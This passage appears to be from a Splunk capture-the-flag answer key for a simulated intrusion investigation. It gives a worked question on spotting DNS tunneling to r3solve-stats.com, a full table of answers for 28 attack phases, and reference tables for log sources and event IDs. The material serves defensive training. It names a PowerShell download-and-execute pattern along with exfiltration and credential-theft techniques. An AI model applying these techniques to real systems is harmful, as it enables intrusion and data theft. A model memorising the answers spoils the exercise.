**Question:** What parent domain received hundreds of subdomain queries from the victim workstation CCS-WS-1025, suggesting DNS was being used as a covert data channel?

**What's happening:** DNS tunneling encodes data inside DNS query subdomains. Instead of querying `example.com`, the attacker's tool queries `aGVsbG8gd29ybGQ.r3solve-stats.com`, where the subdomain carries encoded data. The attacker's nameserver for `r3solve-stats.com` receives and decodes every query. This generates an unusually high volume of queries to a single parent domain — far more than any domain should accumulate from a single host in normal traffic.

**Hint:** Look for a parent domain that received a disproportionately large number of DNS queries from a single endpoint. Legitimate browsing spreads queries across many domains; tunneling concentrates them on one.

**Splunk Search:**
```
index=ctf sourcetype="zeek:dns:json" 
| rex field=query "(?P<parent_domain>[^.]+\.[^.]+)$"
| stats count by parent_domain src_ip
| sort -count
```

**Answer:** `r3solve-stats.com`

**Explanation:** Over 45 minutes, `CCS-WS-1025` (lrodriguez's workstation) sent 337 DNS queries to subdomains of `r3solve-stats.com`, dwarfing every other domain in the results. Each query carried a small chunk of encoded data; the attacker's authoritative nameserver (`ns1.r3solve-stats.com`) received and reassembled it. DNS tunneling is often used as a backup exfil channel because DNS traffic is rarely blocked or deeply inspected at the perimeter.

---

## Summary: Full Attack Timeline

| # | Time | Phase | Technique | Difficulty | Answer |
|---|---|---|---|---|---|
| 1 | Sep 8 13:00 | Reconnaissance | Vulnerability Scanning | 🟢 100 | 45.142.212.100 |
| 2 | Sep 8 13:05 | Reconnaissance | DNS Enumeration | 🔴 500 | autodiscover.ccs.dev |
| 3 | Sep 9 10:15 | Initial Access | WINWORD Child Process | 🟢 100 | cmd.exe |
| 4 | Sep 9 10:15 | Initial Access | Encoded PowerShell | 🔴 500 | IEX DownloadString (cdn-update.globalmetrics.net) |
| 5 | Sep 9 10:15 | Initial Access | C2 DNS First Seen | 🟢 100 | cdn-update.globalmetrics.net |
| 6 | Sep 9 10:15 | Initial Access | JA3 TLS Correlation | 🔴 500 | cdn-update.globalmetrics.net |
| 7 | Sep 9 10:48 | Persistence | Scheduled Task | 🟢 100 | C:\Users\lrodriguez\AppData\Roaming\MicrosoftEdge\update.exe |
| 8 | Sep 9 10:48 | Persistence | Registry Run Key | 🟢 100 | OneDriveSync |
| 9 | Sep 9 10:50 | Persistence | Malicious Service | 🟢 100 | C:\Windows\Temp\svchost32.exe |
| 10 | Sep 9 13:17 | Privilege Escalation | Token Impersonation | 🔴 500 | awilliams |
| 11 | Sep 9 13:22 | Privilege Escalation | UAC Bypass (eventvwr) | 🔴 500 | C:\Windows\Temp\svchost32.exe |
| 12 | Sep 9 13:25 | Privilege Escalation | Backdoor Account | 🟢 100 | ccssupport |
| 13 | Sep 10 08:33 | Defense Evasion | Log Cleared | 🟢 100 | ccssupport |
| 14 | Sep 10 08:41 | Defense Evasion | Timestomping | 🔴 500 | C:\Users\lrodriguez\AppData\Roaming\MicrosoftEdge\update.exe |
| 15 | Sep 10 09:33 | Credential Access | LSASS Dump | 🟡 250 | C:\Windows\Temp\svchost32.exe |
| 16 | Sep 10 09:45 | Credential Access | Kerberoasting | 🟡 250 | svc_sql |
| 17 | Sep 10 09:53 | Credential Access | AS-REP Roasting | 🔴 500 | svc_scan |
| 18 | Sep 10 11:32 | Discovery | Domain Enumeration | 🟡 250 | net user /domain |
| 19 | Sep 10 11:47 | Discovery | BloodHound LDAP | 🔴 500 | lrodriguez |
| 20 | Sep 10 13:45 | Lateral Movement | SMB to File Server | 🟡 250 | 10.10.10.76 |
| 21 | Sep 10 14:10 | Lateral Movement | PsExec | 🟡 250 | PSEXESVC |
| 22 | Sep 10 15:46 | Lateral Movement | RDP to Exec Laptop | 🟢 100 | awilliams |
| 23 | Sep 10 19:10 | Collection | Mass SMB Read | 🟡 250 | 10.10.10.61 |
| 24 | Sep 10 20:30 | Collection | DB Server Pivot | 🔴 500 | 10.10.2.10 |
| 25 | Sep 11 02:15 | Collection | 7-Zip Archive Staging | 🟢 100 | 7z.exe |
| 26 | Sep 11 02:03 | Exfiltration | HTTPS Bulk Transfer | 🟡 250 | 185.250.151.84 |
| 27 | Sep 11 02:03 | Exfiltration | Exfil Domain DNS | 🟢 100 | telemetry.syncanalytics.io |
| 28 | Sep 11 02:10 | Exfiltration | DNS Tunneling | 🔴 500 | r3solve-stats.com |

**Maximum Score: 7,850 points**

---

## Quick Reference: Splunk Sourcetypes

| Sourcetype | Log Source | Key Fields |
|---|---|---|
| `WinEventLog` | Windows Security Log | EventID, SubjectUserName, TargetUserName, LogonType, IpAddress |
| `WinEventLog` | Windows System Log | EventID, ServiceName, ImagePath |
| `XmlWinEventLog` | Sysmon | EventID, Image, ParentImage, CommandLine, TargetImage, TargetObject |
| `zeek:conn:json` | Zeek Connection Log | id_orig_h, id_resp_h, id_resp_p, orig_bytes, resp_bytes |
| `zeek:dns:json` | Zeek DNS Log | id_orig_h, query, answers |
| `zeek:http:json` | Zeek HTTP Log | id_orig_h, id_resp_h, status, uri, user_agent |
| `zeek:ssl:json` | Zeek SSL/TLS Log | id_orig_h, id_resp_h, server_name, ja3, ja3s |
| `cisco:asa:syslog` | Firewall Log | src_ip, dest_ip, dest_port, protocol, action |

## Quick Reference: Key EventIDs

| EventID | Log | Meaning |
|---|---|---|
| 1 | Sysmon | Process Created |
| 2 | Sysmon | File Creation Time Changed (Timestomp) |
| 3 | Sysmon | Network Connection |
| 10 | Sysmon | Process Access (LSASS dump) |
| 13 | Sysmon | Registry Value Set |
| 1102 | Security | Security Log Cleared |
| 4624 | Security | Successful Logon |
| 4662 | Security | Object Access (LDAP/AD) |
| 4688 | Security | Process Created |
| 4698 | Security | Scheduled Task Created |
| 4720 | Security | User Account Created |
| 4768 | Security/Kerberos | TGT Request (AS-REQ) |
| 4769 | Security/Kerberos | TGS Ticket Request |
| 7045 | System | New Service Installed |
